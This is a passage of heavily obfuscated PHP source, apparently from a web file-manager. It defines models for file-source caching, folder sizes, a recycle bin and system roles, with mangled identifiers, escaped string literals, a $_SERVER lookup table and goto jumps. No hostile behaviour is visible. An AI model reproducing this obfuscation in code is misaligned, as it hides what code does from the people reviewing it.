$ïÃÆíÆ›[$ºÊûë‚ì[411]]) { return !1; } $ÍşğÖ’– = $ºÊûë‚ì[473] . $ïÃÆíÆ›[$ºÊûë‚ì[467]]; $©ØÕÚâ = _get(self::$cacheFileInfo, $ÍşğÖ’–); if ($©ØÕÚâ) { return $©ØÕÚâ; } $³«ªÛÆò = Model($ºÊûë‚ì[470])->fileInfo($ïÃÆíÆ›[$ºÊûë‚ì[467]]); if ($³«ªÛÆò) { $³«ªÛÆò[$ºÊûë‚ì[32]] = $ïÃÆíÆ›[$ºÊûë‚ì[32]]; } self::$cacheFileInfo[$ÍşğÖ’–] = $³«ªÛÆò; return $³«ªÛÆò; } private function folderChildrenNumber($ö‡´é™¢) { $ñ¾²ŞÑæ =& $_SERVER[Ãìšã«™]; $’ˆ…´¸ = $this->sourceInfo($ö‡´é™¢); $®›¨Èµ = array($ñ¾²ŞÑæ[584] => array($ñ¾²ŞÑæ[544], $’ˆ…´¸[$ñ¾²ŞÑæ[521]] . $ö‡´é™¢ . $ñ¾²ŞÑæ[545]), $ñ¾²ŞÑæ[581] => $’ˆ…´¸[$ñ¾²ŞÑæ[504]], $ñ¾²ŞÑæ[430] => intval($’ˆ…´¸[$ñ¾²ŞÑæ[431]]), $ñ¾²ŞÑæ[577] => 1); $®‘øÛùÁ = $this->where($®›¨Èµ)->count(); $Ï¹‹¯ÃÊ = $this->where($®›¨Èµ)->where(array($ñ¾²ŞÑæ[577] => 0))->count(); return array($ñ¾²ŞÑæ[84] => $Ï¹‹¯ÃÊ, $ñ¾²ŞÑæ[85] => $®‘øÛùÁ); } public function pathInfo($´Ï¶¿¶ø, $­©­”ØÊ = false) { $Ìóâ½½‘ =& $_SERVER[Ãìšã«™]; $­©­”ØÊ = !1; $´Ï¶¿¶ø = intval($´Ï¶¿¶ø); $­ ‡ ¦¦ = $Ìóâ½½‘[459] . intval($­©­”ØÊ) . $Ìóâ½½‘[460] . $´Ï¶¿¶ø; $ãÓŞÇÉÀ = _get(self::$cachePathInfo, $­ ‡ ¦¦); if ($ãÓŞÇÉÀ) { return $ãÓŞÇÉÀ; } $ãù²‘‚ = $this->sourceInfo($´Ï¶¿¶ø); if (!$ãù²‘‚) { return !1; } $ãù²‘‚ = $this->_listDataApplyItem($ãù²‘‚, $­©­”ØÊ); self::$cachePathInfo[$­ ‡ ¦¦] = $ãù²‘‚; return $ãù²‘‚; } public static $cachePathInfoMore = array(); public function pathInfoMore($òªœºŠ…) { $×˜‚×µÎ =& $_SERVER[Ãìšã«™]; $±ŞúÜ£‰ = _get(self::$cachePathInfoMore, $òªœºŠ…); if ($±ŞúÜ£‰) { return $±ŞúÜ£‰; } $Õ‡œœÊÓ = $this->pathInfo($òªœºŠ…); if (!$Õ‡œœÊÓ) { return !1; } if ($Õ‡œœÊÓ[$×˜‚×µÎ[411]] == $×˜‚×µÎ[89]) { $Õ‡œœÊÓ[$×˜‚×µÎ[83]] = $this->folderChildrenNumber($òªœºŠ…); } self::$cachePathInfoMore[$òªœºŠ…] = $Õ‡œœÊÓ; return $Õ‡œœÊÓ; } public function sourceInfo($—ÒÃÛ“á) { $ÚË¸Éç =& $_SERVER[Ãìšã«™]; if (!$—ÒÃÛ“á) { return array(); } $—ÒÃÛ“á = intval($—ÒÃÛ“á); $ÎãÖéŸ¡ = $ÚË¸Éç[458] . $—ÒÃÛ“á; $êÂì•ìÇ = _get(self::$cacheSourceInfo, $ÎãÖéŸ¡); if ($êÂì•ìÇ) { return $êÂì•ìÇ; } $ØàÛåÙ = $this->where(array($ÚË¸Éç[403] => $—ÒÃÛ“á))->find(); self::$cacheSourceInfo[$ÎãÖéŸ¡] = $ØàÛåÙ; return self::$cacheSourceInfo[$ÎãÖéŸ¡]; } public function sourceCacheClear($€“Îş£ = false) { self::cacheClear($€“Îş£); } public static function cacheClear($Ñ«Œ‚¡Ç = false) { $šÁ©‰öƒ =& $_SERVER[Ãìšã«™]; if ($Ñ«Œ‚¡Ç == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$šÁ©‰öƒ[458] . $Ñ«Œ‚¡Ç]); unset(self::$cachePathInfoMore[$Ñ«Œ‚¡Ç]); unset(self::$cachePathInfo[$šÁ©‰öƒ[2107] . $Ñ«Œ‚¡Ç]); unset(self::$cachePathInfo[$šÁ©‰öƒ[2108] . $Ñ«Œ‚¡Ç]); } public function metaSet($ÚÑ¡òÔƒ, $µÇû·çä = null, $ñÛÅ¯ù® = null) { $½¨Ê¨”³ = parent::metaSet($ÚÑ¡òÔƒ, $µÇû·çä, $ñÛÅ¯ù®); if ($½¨Ê¨”³) { $this->sourceCacheClear($ÚÑ¡òÔƒ); } return $½¨Ê¨”³; } public function pathInfoByPath($Ş±ÕÎóµ, $¤£ğš) { $³ˆüÊ¦µ =& $_SERVER[Ãìšã«™]; $‰ğº¥ƒ÷ = !$¤£ğš ? array() : explode($³ˆüÊ¦µ[8], trim($¤£ğš, $³ˆüÊ¦µ[8])); $ÆÂ™¦°² = $Ş±ÕÎóµ; foreach ($‰ğº¥ƒ÷ as $ÒÊŸœÚ÷) { $—Úö¹Á· = array($³ˆüÊ¦µ[498] => $ÆÂ™¦°², $³ˆüÊ¦µ[32] => $ÒÊŸœÚ÷); $‘®¯Òİñ = $this->where($—Úö¹Á·)->select(); if (!$‘®¯Òİñ) { return !1; } $‘®¯Òİñ = array_sort_by($‘®¯Òİñ, $³ˆüÊ¦µ[431]); $ÆÂ™¦°² = $‘®¯Òİñ[0][$³ˆüÊ¦µ[403]]; } return $this->pathInfo($ÆÂ™¦°², !0); } protected function updateModifyTime($¸Œìäæ‰) { $ûôŞ¿âõ =& $_SERVER[Ãìšã«™]; $œ« ¢Ö = defined($ûôŞ¿âõ[474]) ? USER_ID : $ûôŞ¿âõ[190]; if (!$¸Œìäæ‰) { return; } if (!is_array($¸Œìäæ‰)) { $¸Œìäæ‰ = array($¸Œìäæ‰); } foreach ($¸Œìäæ‰ as $È·§«ÌË => $èÜ—áÙ¬) { $¸Œìäæ‰[$È·§«ÌË] = intval($èÜ—áÙ¬); $this->sourceCacheClear($èÜ—áÙ¬); } $ü©•Ú…ê = array($ûôŞ¿âõ[403] => array($ûôŞ¿âõ[7], $¸Œìäæ‰)); $ÀùùŸß¹ = array($ûôŞ¿âõ[583] => $œ« ¢Ö, $ûôŞ¿âõ[425] => time()); $this->where($ü©•Ú…ê)->save($ÀùùŸß¹); } public function folderSizeReset($¯˜×™², $Ä¦ÄãŸõ = false) { $İ¾Æ¼õ =& $_SERVER[Ãìšã«™]; if ($this->statusIgnoreResetSpace) { return; } $¹»—Ö² = $this->sourceInfo($¯˜×™²); $© ¬”Û = $İ¾Æ¼õ[2109] . $¯˜×™²; CacheLock::lock($© ¬”Û, 20); if ($Ä¦ÄãŸõ === !1) { $this->sourceCacheClear($¯˜×™²); $¹»—Ö² = $this->sourceInfo($¯˜×™²); $¬àèß¿‘ = array($İ¾Æ¼õ[402] => $¯˜×™², $İ¾Æ¼õ[430] => 0); $™úÕµ»¹ = $this->where($¬àèß¿‘)->sum($İ¾Æ¼õ[80]); $Ä¦ÄãŸõ = intval($™úÕµ»¹) - intval($¹»—Ö²[$İ¾Æ¼õ[80]]); } if ($Ä¦ÄãŸõ == 0) { return CacheLock::unlock($© ¬”Û); } $Ï•Ÿşá = $this->parentLevelArray($¹»—Ö²[$İ¾Æ¼õ[521]]); if (!$Ï•Ÿşá) { $Ï•Ÿşá = array(); } $Ï•Ÿşá[] = $¹»—Ö²[$İ¾Æ¼õ[403]]; $¬àèß¿‘ = array($İ¾Æ¼õ[403] => array($İ¾Æ¼õ[419], $Ï•Ÿşá)); if ($Ä¦ÄãŸõ < 0) { $¬àèß¿‘[$İ¾Æ¼õ[80]] = array($İ¾Æ¼õ[1011], abs($Ä¦ÄãŸõ)); } $this->where($¬àèß¿‘)->setAdd($İ¾Æ¼õ[80], $Ä¦ÄãŸõ); CacheLock::unlock($© ¬”Û); $Ø¹ªÒÛï = $İ¾Æ¼õ[2110] . $¹»—Ö²[$İ¾Æ¼õ[412]] . $İ¾Æ¼õ[4] . $¹»—Ö²[$İ¾Æ¼õ[504]]; $ì®Â§ü = array($¹»—Ö²[$İ¾Æ¼õ[412]], $¹»—Ö²[$İ¾Æ¼õ[504]]); TaskRun::timeLimitCall($Ø¹ªÒÛï, $İ¾Æ¼õ[2111], $ì®Â§ü, 1.5); } public function folderSizeResetChildren($Ê€Ê«Ğï) { $ŞÑ¼Ñ· =& $_SERVER[Ãìšã«™]; $this->sourceCacheClear($Ê€Ê«Ğï); $…Åï¹êÂ = $this->sourceInfo($Ê€Ê«Ğï); $Ú˜Ğ°ğ¯ = array($ŞÑ¼Ñ·[577] => 1, $ŞÑ¼Ñ·[581] => $…Åï¹êÂ[$ŞÑ¼Ñ·[504]], $ŞÑ¼Ñ·[584] => array($ŞÑ¼Ñ·[544], $…Åï¹êÂ[$ŞÑ¼Ñ·[521]] . $Ê€Ê«Ğï . $ŞÑ¼Ñ·[545])); $öÇÏì—Ô = $ŞÑ¼Ñ·[2112]; $ÉÀÜóíÍ = $this->field($öÇÏì—Ô)->where($Ú˜Ğ°ğ¯)->select(); $Ú˜Ğ°ğ¯[$ŞÑ¼Ñ·[411]] = 0; $¯§àÍ°Â = $this->field($öÇÏì—Ô)->where($Ú˜Ğ°ğ¯)->select(); if (!$¯§àÍ°Â) { return; } $ÉÀÜóíÍ[] = $…Åï¹êÂ; $ÉÀÜóíÍ = array_to_keyvalue($ÉÀÜóíÍ, $ŞÑ¼Ñ·[403]); foreach ($ÉÀÜóíÍ as $ãÅ…ŞæÑ => $Ìùµ§£) { $ÉÀÜóíÍ[$ãÅ…ŞæÑ][$ŞÑ¼Ñ·[2113]] = $ÉÀÜóíÍ[$ãÅ…ŞæÑ][$ŞÑ¼Ñ·[80]]; $ÉÀÜóíÍ[$ãÅ…ŞæÑ][$ŞÑ¼Ñ·[80]] = 0; } foreach ($¯§àÍ°Â as $Ìùµ§£) { $÷€”³ùğ = $Ìùµ§£[$ŞÑ¼Ñ·[498]] . $ŞÑ¼Ñ·[12]; if (!isset($ÉÀÜóíÍ[$÷€”³ùğ])) { continue; } if ($Ìùµ§£[$ŞÑ¼Ñ·[431]] == $ÉÀÜóíÍ[$÷€”³ùğ][$ŞÑ¼Ñ·[431]]) { $ÉÀÜóíÍ[$÷€”³ùğ][$ŞÑ¼Ñ·[80]] += $Ìùµ§£[$ŞÑ¼Ñ·[80]]; } } foreach ($ÉÀÜóíÍ as $Ìùµ§£) { $èØÕ¬¨– = $this->parentLevelArray($Ìùµ§£[$ŞÑ¼Ñ·[521]]); foreach ($èØÕ¬¨– as $÷€”³ùğ) { $÷€”³ùğ = $÷€”³ùğ . $ŞÑ¼Ñ·[12]; if (!isset($ÉÀÜóíÍ[$÷€”³ùğ])) { continue; } if ($Ìùµ§£[$ŞÑ¼Ñ·[431]] == $ÉÀÜóíÍ[$÷€”³ùğ][$ŞÑ¼Ñ·[431]]) { $ÉÀÜóíÍ[$÷€”³ùğ][$ŞÑ¼Ñ·[80]] += $Ìùµ§£[$ŞÑ¼Ñ·[80]]; } } } $ôø…¬£Œ = array(); foreach ($ÉÀÜóíÍ as $Ìùµ§£) { if ($Ìùµ§£[$ŞÑ¼Ñ·[80]] == $Ìùµ§£[$ŞÑ¼Ñ·[2113]]) { continue; } $ôø…¬£Œ[] = array($ŞÑ¼Ñ·[403], $Ìùµ§£[$ŞÑ¼Ñ·[403]], $ŞÑ¼Ñ·[80], $Ìùµ§£[$ŞÑ¼Ñ·[80]]); } $this->saveAll($ôø…¬£Œ); } public function userSpaceReset($ê£èæ­ = false) { $éÄ„ç¢× =& $_SERVER[Ãìšã«™]; $±÷Õ¤…ü = $this->where(array($éÄ„ç¢×[412] => self::TYPE_USER, $éÄ„ç¢×[504] => $ê£èæ­, $éÄ„ç¢×[411] => 0))->sum($éÄ„ç¢×[80]); $±÷Õ¤…ü = !$±÷Õ¤…ü || $±÷Õ¤…ü <= 0 ? 0 : $±÷Õ¤…ü; Model($éÄ„ç¢×[513])->userEdit($ê£èæ­, array($éÄ„ç¢×[1807] => $±÷Õ¤…ü)); } public function targetSpaceUpdate($ÒÕÎ»áÏ, $“ù”š†) { $é¶ùÛò© =& $_SERVER[Ãìšã«™]; if (!$“ù”š†) { return; } if (!in_array($ÒÕÎ»áÏ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÑŠÇÖÍ· = $this->targetSpaceSize($ÒÕÎ»áÏ, $“ù”š†); if ($ÒÕÎ»áÏ == self::TYPE_USER) { Model($é¶ùÛò©[513])->userEdit($“ù”š†, array($é¶ùÛò©[1807] => $ÑŠÇÖÍ·)); } else { if ($ÒÕÎ»áÏ == self::TYPE_GROUP) { Model($é¶ùÛò©[522])->groupEdit($“ù”š†, array($é¶ùÛò©[1807] => $ÑŠÇÖÍ·)); } } } public function targetSpaceSize($¥ÉÍöË, $”²ÁŠÇ½) { $ÃªÄŸ®Ğ =& $_SERVER[Ãìšã«™]; $¦ØñµâÉ = $this->sourceRoot($¥ÉÍöË, $”²ÁŠÇ½, !0); if (!$¦ØñµâÉ) { return 0; } $×ï›¨¢ = floatval($¦ØñµâÉ[$ÃªÄŸ®Ğ[80]]); $èÀÈœÔŞ = array($ÃªÄŸ®Ğ[584] => array($ÃªÄŸ®Ğ[544], $ÃªÄŸ®Ğ[531] . $¦ØñµâÉ[$ÃªÄŸ®Ğ[403]] . $ÃªÄŸ®Ğ[545])); $ÃÈ³¨µ¼ = Model($ÃªÄŸ®Ğ[429])->field($ÃªÄŸ®Ğ[418])->where($èÀÈœÔŞ)->select(); $ÃÈ³¨µ¼ = array_to_keyvalue($ÃÈ³¨µ¼, $ÃªÄŸ®Ğ[12], $ÃªÄŸ®Ğ[403]); $ÃÈ³¨µ¼ = array_unique(array_filter($ÃÈ³¨µ¼)); if ($ÃÈ³¨µ¼) { $èÀÈœÔŞ = array($ÃªÄŸ®Ğ[418] => array($ÃªÄŸ®Ğ[419], $ÃÈ³¨µ¼)); $×ï›¨¢ += floatval($this->where($èÀÈœÔŞ)->sum($ÃªÄŸ®Ğ[80])); } $×ï›¨¢ = !$×ï›¨¢ || $×ï›¨¢ <= 0 ? 0 : $×ï›¨¢; return $×ï›¨¢; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($²´Ş‡Äá) { return $this->fileTypeProfile($²´Ş‡Äá, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ß€®‹»ã) { return $this->fileTypeProfile($ß€®‹»ã, SourceModel::TYPE_GROUP); } private function fileTypeProfile($´ªêèúû, $’ùï”ü²) { $ı¿Œ·â« =& $_SERVER[Ãìšã«™]; $Ì©âñê£ = $ı¿Œ·â«[2114] . $´ªêèúû . $ı¿Œ·â«[11] . $’ùï”ü²; $ãóÒöÈÍ = Cache::get($Ì©âñê£); if ($ãóÒöÈÍ) { return $ãóÒöÈÍ; } $Í­éğØï = array($ı¿Œ·â«[577] => 0); if ($´ªêèúû != !1) { $Í­éğØï[$ı¿Œ·â«[504]] = $´ªêèúû; $Í­éğØï[$ı¿Œ·â«[412]] = $’ùï”ü²; } $¢¤õú = array(); $¢¤õú[$ı¿Œ·â«[2115]] = array($ı¿Œ·â«[2116] => LNG($ı¿Œ·â«[2115]), $ı¿Œ·â«[2117] => $this->where($Í­éğØï)->count(), $ı¿Œ·â«[579] => $this->where($Í­éğØï)->sum($ı¿Œ·â«[80])); $­ó˜ùü = KodIO::fileTypeList(); foreach ($­ó˜ùü as $£çâã€ => $Ã·òÆÄ) { $Í­éğØï[$ı¿Œ·â«[413]] = $this->fileTypeWhere($£çâã€); $¢¤õú[$£çâã€] = array($ı¿Œ·â«[2116] => $Ã·òÆÄ[$ı¿Œ·â«[32]], $ı¿Œ·â«[2117] => $this->where($Í­éğØï)->count(), $ı¿Œ·â«[579] => $this->where($Í­éğØï)->sum($ı¿Œ·â«[80])); } Cache::set($Ì©âñê£, $¢¤õú, 1200); return $¢¤õú; } public function fileNameExist($á²É€¢İ, $÷»·ê‚å) { $·¤«ô× =& $_SERVER[Ãìšã«™]; $’±»ÛÉı = $this->where(array($·¤«ô×[498] => $á²É€¢İ, $·¤«ô×[32] => $÷»·ê‚å, $·¤«ô×[431] => 0))->find(); return is_array($’±»ÛÉı) ? $’±»ÛÉı[$·¤«ô×[403]] : !1; } public function childList($åÃ¾¾å°) { $²Ì÷‹¯Ù =& $_SERVER[Ãìšã«™]; $Š¦ §Ë© = $²Ì÷‹¯Ù[2092] . $åÃ¾¾å°; if (isset(self::$cacheChildList[$Š¦ §Ë©])) { return self::$cacheChildList[$Š¦ §Ë©]; } $ÓóÑÀÉ‹ = array($²Ì÷‹¯Ù[498] => intval($åÃ¾¾å°), $²Ì÷‹¯Ù[431] => 0); $øÛ£„¥ = $this->where($ÓóÑÀÉ‹)->select(); $øÛ£„¥ = $øÛ£„¥ ? $øÛ£„¥ : array(); self::$cacheChildList[$Š¦ §Ë©] = $øÛ£„¥; foreach ($øÛ£„¥ as $”µ¬Õâã) { $Š¦ §Ë© = $²Ì÷‹¯Ù[458] . $”µ¬Õâã[$²Ì÷‹¯Ù[403]]; self::$cacheSourceInfo[$Š¦ §Ë©] = $”µ¬Õâã; } return $øÛ£„¥; } public function fileNameAuto($æéé¹õ», $ÉğÔüÜñ, $î…‚¯£ñ = REPEAT_RENAME, $æ¬·ğ¥² = false) { $âó™ª¥î =& $_SERVER[Ãìšã«™]; $ÄšñŸßæ = array($âó™ª¥î[498] => $æéé¹õ», $âó™ª¥î[431] => 0, $âó™ª¥î[32] => array($âó™ª¥î[378], $ÉğÔüÜñ . $âó™ª¥î[379])); $ø¿‡ÆìË = $this->field($âó™ª¥î[32])->where($ÄšñŸßæ)->select(); $–¯ÃäÃÙ = array_to_keyvalue($ø¿‡ÆìË, $âó™ª¥î[12], $âó™ª¥î[32]); return $this->fileNameAutoGet($–¯ÃäÃÙ, $ÉğÔüÜñ, $î…‚¯£ñ, $æ¬·ğ¥²); } public function fileNameAutoGet($ÙÕïäü¹, $á÷ôÍÕÅ, $ı‘Û»ë›, $İóáƒšÂ) { $©ÈœäŠ =& $_SERVER[Ãìšã«™]; if ($ı‘Û»ë› == REPEAT_REPLACE || !$ÙÕïäü¹ || !in_array_not_case($á÷ôÍÕÅ, $ÙÕïäü¹) || $İóáƒšÂ && $ı‘Û»ë› != REPEAT_RENAME_FOLDER) { return $á÷ôÍÕÅ; } if ($ı‘Û»ë› == REPEAT_SKIP) { return !1; } $Çûª£‹“ = $©ÈœäŠ[10] . get_path_ext($á÷ôÍÕÅ); $Çûª£‹“ = $Çûª£‹“ == $©ÈœäŠ[10] || $İóáƒšÂ ? $©ÈœäŠ[12] : $Çûª£‹“; for ($²Œ¹ü¼î = 1; $²Œ¹ü¼î <= count($ÙÕïäü¹) + 1; $²Œ¹ü¼î++) { $Æ÷éú‡” = substr($á÷ôÍÕÅ, 0, strlen($á÷ôÍÕÅ) - strlen($Çûª£‹“)); $‹å§ç¶İ = $Æ÷éú‡” . "\x28{$²Œ¹ü¼î}\51{$Çûª£‹“}"; if (!in_array_not_case($‹å§ç¶İ, $ÙÕïäü¹)) { return $‹å§ç¶İ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\x72\x63\x65\137\162\x65\143\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\x54\x69\x6d\x65", "\x74\x69\155\x65", "\x69\156\x73\x65\162\164", "\x66\165\x6e\x63\164\x69\157\156")); public function listData($Š›³ÊÜ¯ = false) { $Ñ÷üè =& $_SERVER[Ãìšã«™]; $Š›³ÊÜ¯ = $Š›³ÊÜ¯ ? $Š›³ÊÜ¯ : USER_ID; $ÚÊûÆå = $this->where(array($Ñ÷üè[1641] => $Š›³ÊÜ¯))->select(); return array_to_keyvalue($ÚÊûÆå, $Ñ÷üè[12], $Ñ÷üè[403]); } public function moveToRecycle($©½ô–Äª) { $ÂÎíéò‡ =& $_SERVER[Ãìšã«™]; $²Ó‰³ñ– = Model($ÂÎíéò‡[1321]); $Ğ‘ÇšØì = $²Ó‰³ñ–->sourceInfo($©½ô–Äª); if (!$Ğ‘ÇšØì || $Ğ‘ÇšØì[$ÂÎíéò‡[431]] == $ÂÎíéò‡[89]) { return; } $±äº£ƒÙ = array($ÂÎíéò‡[418] => $©½ô–Äª, $ÂÎíéò‡[1641] => USER_ID, $ÂÎíéò‡[580] => $Ğ‘ÇšØì[$ÂÎíéò‡[412]], $ÂÎíéò‡[581] => $Ğ‘ÇšØì[$ÂÎíéò‡[504]], $ÂÎíéò‡[584] => $Ğ‘ÇšØì[$ÂÎíéò‡[521]]); $this->add($±äº£ƒÙ); $this->recycleMove($©½ô–Äª, 1); if ($Ğ‘ÇšØì[$ÂÎíéò‡[411]] == $ÂÎíéò‡[89]) { $ß ìÌ¾Ô = array($ÂÎíéò‡[584] => array($ÂÎíéò‡[544], $Ğ‘ÇšØì[$ÂÎíéò‡[521]] . $©½ô–Äª . $ÂÎíéò‡[545])); $²Ó‰³ñ–->where($ß ìÌ¾Ô)->setField($ÂÎíéò‡[431], 1); } } public function clear() { $this->remove(!1); } public function remove($øËˆõã— = false, $ÆÂšÖ  = false) { $¢ø·˜ğ… =& $_SERVER[Ãìšã«™]; $ÆÂšÖ  = $ÆÂšÖ  ? $ÆÂšÖ  : USER_ID; $ƒ¼ôğÇ² = Model($¢ø·˜ğ…[1321]); $¤·ºíšÓ = $this->listData($ÆÂšÖ ); $øËˆõã— = $øËˆõã— === !1 ? !1 : $øËˆõã—; $ŞÎÏÆ = array(); foreach ($¤·ºíšÓ as $ğÑíİ›ñ) { if ($øËˆõã— != !1 && !in_array($ğÑíİ›ñ, $øËˆõã—)) { continue; } $şüÚíº = $ƒ¼ôğÇ²->sourceInfo($ğÑíİ›ñ); $ƒ¼ôğÇ²->remove($ğÑíİ›ñ, !1); $Á¢ïˆî– = $şüÚíº[$¢ø·˜ğ…[412]] . $¢ø·˜ğ…[11] . $şüÚíº[$¢ø·˜ğ…[504]]; $ŞÎÏÆ[$Á¢ïˆî–] = array($¢ø·˜ğ…[580] => $şüÚíº[$¢ø·˜ğ…[412]], $¢ø·˜ğ…[504] => $şüÚíº[$¢ø·˜ğ…[504]]); $this->where(array($¢ø·˜ğ…[403] => $ğÑíİ›ñ))->delete(); } foreach ($ŞÎÏÆ as $Ú—Ö¾ÇŸ) { $ƒ¼ôğÇ²->targetSpaceUpdate($Ú—Ö¾ÇŸ[$¢ø·˜ğ…[412]], $Ú—Ö¾ÇŸ[$¢ø·˜ğ…[504]]); } } public function restore($›ŠÔïšÚ = false) { $¦Úøè = $this->listData(); $this->_restoreSource($¦Úøè, $›ŠÔïšÚ); } public function removeUserAll($¿¶ÖøØ„) { $this->remove(!1, $¿¶ÖøØ„); } private function _restoreSource($î§ƒÛ, $Ğëæ·î) { $©ç¹äš =& $_SERVER[Ãìšã«™]; $áÀ˜”ğê = Model($©ç¹äš[1321]); $Ğëæ·î = $Ğëæ·î == !1 ? !1 : $Ğëæ·î; if (!$î§ƒÛ) { return !0; } $ƒÉ‰ä÷‘ = array(); foreach ($î§ƒÛ as $§ÅŠïÇ·) { if ($Ğëæ·î != !1 && !in_array($§ÅŠïÇ·, $Ğëæ·î)) { continue; } $éÒÖã³İ = $áÀ˜”ğê->sourceInfo($§ÅŠïÇ·); $âßÀ™íì = $áÀ˜”ğê->sourceInfo($éÒÖã³İ[$©ç¹äš[498]]); if ($âßÀ™íì[$©ç¹äš[431]] == $©ç¹äš[89]) { continue; } $áÀ˜”ğê->lockMoveStart($§ÅŠïÇ·); $this->recycleMove($§ÅŠïÇ·, 0); if ($éÒÖã³İ[$©ç¹äš[411]] == $©ç¹äš[89]) { $£ñ–Öåó = array($©ç¹äš[584] => array($©ç¹äš[544], $éÒÖã³İ[$©ç¹äš[521]] . $§ÅŠïÇ· . $©ç¹äš[545])); $áÀ˜”ğê->where($£ñ–Öåó)->setField($©ç¹äš[431], 0); $this->restoreFolderChildren($§ÅŠïÇ·, $î§ƒÛ); } $this->where(array($©ç¹äš[403] => $§ÅŠïÇ·))->delete(); $áÀ˜”ğê->folderSizeReset($éÒÖã³İ[$©ç¹äš[498]]); $ƒÉ‰ä÷‘[] = $éÒÖã³İ[$©ç¹äš[498]]; if ($éÒÖã³İ[$©ç¹äš[411]] == $©ç¹äš[89]) { $ƒÉ‰ä÷‘[] = $§ÅŠïÇ·; } $áÀ˜”ğê->lockMoveEnd($§ÅŠïÇ·); } $áÀ˜”ğê->updateModifyTime($ƒÉ‰ä÷‘); } private function restoreFolderChildren($šø×œÁ„, $ˆ‹ÉÉîÆ) { $Ëƒ¡’€ =& $_SERVER[Ãìšã«™]; $Òô¹Û£ß = Model($Ëƒ¡’€[1321]); $‚«ºÅÜí = array($Ëƒ¡’€[403] => array($Ëƒ¡’€[7], array())); foreach ($ˆ‹ÉÉîÆ as $°Øºâï«) { if ($°Øºâï« == $šø×œÁ„) { continue; } if (!$Òô¹Û£ß->isParentOf($šø×œÁ„, $°Øºâï«)) { continue; } $´ıº©åŸ = $Òô¹Û£ß->sourceInfo($°Øºâï«); if ($´ıº©åŸ[$Ëƒ¡’€[411]] == $Ëƒ¡’€[89]) { $‚«ºÅÜí[] = array($Ëƒ¡’€[584] => array($Ëƒ¡’€[544], $´ıº©åŸ[$Ëƒ¡’€[521]] . $°Øºâï« . $Ëƒ¡’€[545])); } else { $‚«ºÅÜí[$Ëƒ¡’€[403]][1][] = $°Øºâï«; } } if (!$‚«ºÅÜí[$Ëƒ¡’€[403]][1]) { unset($‚«ºÅÜí[$Ëƒ¡’€[403]]); } if (!$‚«ºÅÜí) { return; } $‚«ºÅÜí[$Ëƒ¡’€[403]][1] = array_unique($‚«ºÅÜí[$Ëƒ¡’€[403]][1]); $‚«ºÅÜí[$Ëƒ¡’€[996]] = $Ëƒ¡’€[1913]; $Òô¹Û£ß->where($‚«ºÅÜí)->setField($Ëƒ¡’€[431], 1); } private function recycleMove($ª–Øî¾Ÿ, $ìÑ¦ôó‘ = 1) { $¯´âÑı¤ =& $_SERVER[Ãìšã«™]; $ªÛ€öøÔ = Model($¯´âÑı¤[1321]); $æãÃë = Model($¯´âÑı¤[2118]); $¤×é÷³‰ = array($¯´âÑı¤[403] => $ª–Øî¾Ÿ); if ($ìÑ¦ôó‘) { $ªÛ€öøÔ->where($¤×é÷³‰)->setField($¯´âÑı¤[431], 1); $æãÃë->eventRecycle($ª–Øî¾Ÿ, $¯´âÑı¤[2119]); } else { $¯ìÇõÙõ = $ªÛ€öøÔ->where($¤×é÷³‰)->find(); $ÚúÀâíÉ = $¯ìÇõÙõ[$¯´âÑı¤[411]] == $¯´âÑı¤[89]; $ã–«Ç© = $ªÛ€öøÔ->fileNameAuto($¯ìÇõÙõ[$¯´âÑı¤[498]], $¯ìÇõÙõ[$¯´âÑı¤[32]], REPEAT_RENAME_FOLDER, $ÚúÀâíÉ); if ($ã–«Ç© != $¯ìÇõÙõ[$¯´âÑı¤[32]]) { $ªÛ€öøÔ->rename($ª–Øî¾Ÿ, $ã–«Ç©); } $ªÛ€öøÔ->where($¤×é÷³‰)->setField($¯´âÑı¤[431], 0); $æãÃë->eventRecycle($ª–Øî¾Ÿ, $¯´âÑı¤[2120]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\56\163\157\165\x72\x63\x65\123\x65\143\162\145\164\114\x69\x73\x74"; public $field = array("\163\157\165\162\x63\145\111\104", "\164\171\160\145\111\x44", "\143\162\x65\141\x74\x65\x55\163\145\162"); } goto fÃô‹’Ë–ã; CÑ¢ÍÙ°ÍÚ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\162\157\x6c\145\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x61\165\164\150", "\x6c\141\x62\x65\154", "\144\x69\x73\160\154\x61\x79", "\163\171\163\164\x65\x6d", "\x64\x65\163\143", "\151\147\x6e\157\x72\145\105\x78\x74", "\x69\147\156\x6f\x72\145\106\151\x6c\145\123\151\172\x65", "\x61\x64\155\x69\156\151\163\x74\162\x61\x74\x6f\162", "\163\157\162\164"); public function listData($ïê–¯Äğ = false, $ÌôµöÔ = "\163\x6f\x72\164", $Àé·Ÿ° = false) { $ÙÆŸƒÈ =& $_SERVER[Ãìšã«™]; $Èå·¡Ï• = parent::listData($ïê–¯Äğ, $ÌôµöÔ, $Àé·Ÿ°); if (!$ïê–¯Äğ) { foreach ($Èå·¡Ï• as $ÇÈì°çß => $šüÕ¦Ï§) { if ($šüÕ¦Ï§[$ÙÆŸƒÈ[2011]] == 1) { $Èå·¡Ï•[$ÇÈì°çß][$ÙÆŸƒÈ[451]] = LNG($ÙÆŸƒÈ[2237]); } } } return $Èå·¡Ï•; } public function update($Ğ¬Õ½ë¸, $øÓÄÜ÷§) { $¢§£ÎËÔ =& $_SERVER[Ãìšã«™]; $…é®• = parent::listData($Ğ¬Õ½ë¸); $ÅÒßÅ®Ê = $this->findByName($øÓÄÜ÷§[$¢§£ÎËÔ[32]]); if (!$…é®• || $ÅÒßÅ®Ê && $ÅÒßÅ®Ê[$¢§£ÎËÔ[392]] != $…é®•[$¢§£ÎËÔ[392]]) { return !1; } if ($ÅÒßÅ®Ê[$¢§£ÎËÔ[2011]] == 1) { $øÓÄÜ÷§ = array($¢§£ÎËÔ[32] => $øÓÄÜ÷§[$¢§£ÎËÔ[32]], 